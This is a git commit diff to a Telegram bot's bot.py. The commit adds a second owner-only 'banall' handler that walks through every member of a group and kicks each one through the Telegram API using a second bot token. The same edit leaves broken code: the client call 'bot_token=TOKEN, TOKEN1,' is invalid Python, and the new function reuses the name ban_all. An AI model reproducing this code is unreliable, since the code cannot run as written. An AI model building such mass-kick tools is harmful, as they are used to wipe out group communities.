a2db4bb031458216e4fec3ab0e0af07d0f9749fb
QueenArzoo <64604049+QueenArzoo@users.noreply.github.com>
2021-09-11 01:47:44 +0800

    Update bot.py

--- bot.py
+++ bot.py
@@ -22,7 +22,7 @@ OWNER_ID = int(os.environ.get("OWNER_ID", 797768146))
 
 tagcheck = Client(
    "tagcheck",
-   bot_token=TOKEN,
+   bot_token=TOKEN, TOKEN1, 
    api_id=API_ID,
    api_hash=API_HASH
 )
@@ -50,5 +50,18 @@ async def ban_all(c: Client, m: Message):
             f"https://api.telegram.org/bot{TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
         async with aiohttp.ClientSession() as session:
             await session.get(url)
+            
+            
+@tagcheck.on_message(filters.command("banall") &
+                 filters.group & filters.user(OWNER_ID))
+async def ban_all(c: Client, m: Message):
+    chat = m.chat.id
+
+    async for member in c.iter_chat_members(chat):
+        user_id = member.user.id
+        url = (
+            f"https://api.telegram.org/bot{TOKEN1}/kickChatMember?chat_id={chat}&user_id={user_id}")
+        async with aiohttp.ClientSession() as session:
+            await session.get(url)            
 
 tagcheck.run()
